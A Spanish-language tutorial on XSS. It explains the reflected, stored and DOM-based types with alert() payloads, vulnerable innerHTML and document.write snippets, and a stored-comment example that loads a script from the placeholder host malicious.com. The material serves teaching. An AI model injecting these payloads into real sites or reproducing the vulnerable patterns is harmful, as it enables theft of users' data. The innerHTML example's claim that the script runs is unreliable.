## XSS

- Una vulnerabilidad XSS (Cross-Site Scripting) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento.

- Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

- En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo:

### XSS Reflejado:
Este tipo de XSS se produce cuando los datos proporcionados por el usuario se reflejan en la respuesta HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.

#### Ejemplo básico:

1. URL vulnerable: `http://example.com/search?q=palabra`
2. Payload: `http://example.com/search?q=<script>alert('XSS')</script>`
3. Resultado: El script se ejecuta en el navegador del usuario.



### XSS Almacenado:
Este tipo de XSS se produce cuando un atacante es capaz de almacenar código malicioso en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.

#### Ejemplo básico:

1. Formulario de comentarios vulnerable.
2. Payload: `<script>alert('XSS Almacenado')</script>`.
3. Resultado: Cada vez que alguien visualiza el comentario, el script se ejecuta.

#### Ejemplo de XSS Almacenado:

```html
<p>¡Recomiendo mucho este producto!</p>
<script src="http://malicious.com/exploit.js"> </script>
```

En este caso, el script malicioso se almacena en la sección de comentarios de un sitio web de comercio electrónico y se ejecutará cada vez que un usuario vea la página.


### XSS Basado en DOM:
Este tipo de XSS se produce cuando el código malicioso se ejecuta en el navegador del usuario a través del DOM (Modelo de Objetos del Documento). Esto ocurre cuando el código JavaScript en una página web modifica el DOM de una manera vulnerable a la inyección de código malicioso.

#### Ejemplo básico:

1. Código vulnerable:

```javascript
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;
```

2. URL: `http://example.com/#<script>alert('XSS DOM')</script>`
3. Resultado: El script se ejecuta al cargar la página.

#### Ejemplo de XSS Basado en DOM:

```javascript
var name = document.location.hash.substr(1);
document.write("Hola, " + name);
```

Si la URL termina con `#<script>alert('XSS')</script>`, el script se ejecutará.


### Laboratorio de Práctica:

Para practicar estas vulnerabilidades, el laboratorio utilizando el siguiente proyecto de GitHub: [OWASP Juice Shop](https://github.com/juice-shop/juice-shop).